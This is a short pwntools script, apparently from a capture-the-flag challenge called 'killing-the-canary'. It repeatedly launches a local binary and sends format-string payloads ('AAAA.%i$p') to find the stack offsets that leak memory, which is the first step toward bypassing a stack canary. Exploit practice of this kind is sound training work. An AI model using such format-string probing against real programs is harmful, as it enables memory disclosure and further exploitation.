from pwn import *

exe = ELF("./killing-the-canary")
for i in range(1, 25):
    r = process([exe.path])
    r.recvuntil(b"What's your name? ")
    fmt = f"AAAA.%{i}$p".encode()
    r.sendline(fmt)
    out = r.recvuntil(b"What's your message?")
    print(f"Offset {i}: {out.decode(errors='ignore')}")
    r.close()